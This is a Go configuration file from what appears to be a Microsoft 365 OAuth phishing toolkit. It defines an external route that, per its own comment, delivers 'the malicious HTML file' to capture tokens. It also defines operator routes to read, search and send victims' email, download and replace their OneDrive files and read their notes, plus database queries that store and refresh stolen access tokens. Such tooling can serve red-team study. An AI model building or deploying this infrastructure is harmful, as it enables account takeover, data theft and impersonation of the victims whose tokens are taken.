package model

// Public Configuration File
var GlbConfig Config
var GlbRules []Rule

// This file contains all the API definition endpoints.

// Endpoints exposed outside. Is used to deliver the malicious HTML file and get the token.
var ExtMainPage = "/"
var ExtTokenPage = "/gettoken"

// Endpoints exposed locally for admins

var IntMainPage = "/"
var IntGetAll = "/users"
var IntGetUser = "/user/{id}"
var IntDelUser = "/user/{id}/del"

// Live interaction

var IntLiveMain = "/live/user/{id}"
var IntLiveSearchMail = "/live/user/{id}/emails"
var IntLiveSendMail = "/live/user/{id}/send/email"

var IntLiveOpenMail = "/live/user/{id}/email/{email_id}"
var IntLiveSearchFiles = "/live/user/{id}/files"
var IntLiveDownloadFile = "/live/user/{id}/file/{fileid}"
var IntLiveReplaceFile = "/live/user/{id}/replace/{fileid}"

var IntAllEmails = "/emails"
var IntSearchEmails = "/emails/search"
var IntUserEmails = "/user/{id}/emails"
var IntUserEmail = "/user/email/{id}"

var IntUserFiles = "/user/{email}/files"
var IntUserFile = "/user/{email}/file/" // Make it a public dir so you can download without needeng to specify the name

var IntUserNotes = "/user/{id}/notes"
var IntUserNote = "/user/{id}/note/{note_id}"

var IntAbout = "/about"

// Microsoft Endpoint URLS

var ApiEndpointRoot = "https://graph.microsoft.us/v1.0"

// Outlook - /messages
// OneDrive - /drives
// OneNote - /onenote/notebooks

// Queries for the DB

// User Query

//INSERT OR IGNORE INTO my_table VALUES () UPDATE my_table SET x=y WHERE xx=xx This query to be later used to update the access token.

var InsertUserQuery = "INSERT OR REPLACE INTO users VALUES(?,?,?,?,?,?,?,?);"
var GetUsersQuery = "SELECT * FROM users WHERE AccessTokenActive = 1;"
var UpdateTokensQuery = "UPDATE users SET AccessToken = ? , RefreshToken = ?, AccessTokenActive = ? WHERE Mail = ?; "

var GetUserByEmailQuery = "SELECT * FROM users WHERE Mail = ? "

var GetMailsQuery = "SELECT * FROM mails;"
var GetUserMailsQuery = "SELECT * FROM mails WHERE User = ?;"

var SearchUserMailsQuery = "SELECT * FROM mails WHERE User = ? and BodyContent LIKE ?;"
var SearchEmailQuery = "SELECT * FROM mails WHERE BodyContent LIKE ?;"

var InsertMailQuery = "INSERT OR IGNORE INTO mails VALUES(?,?,?,?,?,?,?,?,?);"
var GetEmailQuery = "SELECT * FROM mails WHERE Id = ?"
